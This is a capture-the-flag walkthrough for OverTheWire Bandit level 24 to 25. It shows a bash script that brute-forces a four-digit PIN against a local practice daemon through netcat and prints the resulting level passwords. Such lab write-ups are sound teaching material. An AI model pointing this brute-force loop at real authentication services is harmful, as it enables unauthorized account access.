## Overview

In this level, we are tasked with brute-forcing a 4-digit pincode to retrieve the password for Bandit Level 25. A daemon is running on port 30002 and requires us to enter the password for Bandit Level 24 and the secret pincode. The correct pincode is hidden among 10,000 possible combinations, and we need to automate the process of trying all combinations to find the correct one.

---

## A little bit of Theory

In this level, we use concepts from previous levels, such as **grep** (Level 6), **netcat** (Level 15/Level 21), and basic **bash scripting**. Specifically, we use a **for-loop** in bash to iterate over the range of possible pin codes.

The syntax for a **for-loop** in bash is:

```bash
for var in 1 2 ... N
do
    #something
done
```

If we want to loop over a range, we can use `{0..10}` to specify the range. To ensure every number has two digits, we can use `{00..10}`.

---

## Solution

### Step 1: Connect to the daemon

First, we connect to the daemon using **netcat** to see the prompt and the response it gives:

```bash
bandit24@bandit:~$ nc localhost 30002
```

### Output:

```
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0000 
Wrong! Please enter the correct pincode. Try again.
```

We observe that the daemon responds with `Wrong! Please enter the correct pincode. Try again.` when the pincode is incorrect. This will be useful for filtering the correct pincode later.

### Step 2: Create the brute-force script

Since manually brute-forcing the 10,000 combinations would be tedious, we write a bash script to automate the process. The script iterates over all 4-digit combinations and appends them to a file, which is then sent to the daemon:

```bash
#!/bin/bash

for i in {0000..9999}
do
        echo gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i >> possibilities.txt
done

cat possibilities.txt | nc localhost 30002 > result.txt
```

### Step 3: Save and execute the script

We save the script in a temporary directory and make it executable:

```bash
bandit24@bandit:~$ mktemp -d
/tmp/tmp.3YQNHtW1Uu
bandit24@bandit:~$ cd /tmp/tmp.3YQNHtW1Uu
bandit24@bandit:/tmp/tmp.3YQNHtW1Uu$ nano brute_force_pin.sh
bandit24@bandit:/tmp/tmp.3YQNHtW1Uu$ chmod +x brute_force_pin.sh
```

Next, we run the script:

```bash
bandit24@bandit:/tmp/tmp.3YQNHtW1Uu$ ./brute_force_pin.sh
```

### Step 4: Check the output

After running the script, we check if the two files were created (`possibilities.txt` and `result.txt`):

```bash
bandit24@bandit:/tmp/tmp.3YQNHtW1Uu$ ls
brute_force_pin.sh  possibilities.txt  result.txt
```

The `result.txt` file contains the output from the daemon. We now filter the response to find the correct pincode by excluding the lines containing "Wrong!" using **grep**:

```bash
bandit24@bandit:/tmp/tmp.3YQNHtW1Uu$ sort result.txt | grep -v "Wrong!"
```

### Output:

```
Correct!
Exiting.
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```

The password for **Bandit Level 25** is:

`iCi86ttT4KSNe1armKiwbQNmB3YJP3q4`

---

## Official Level Link

[Bandit Level 25](https://overthewire.org/wargames/bandit/bandit25.html)
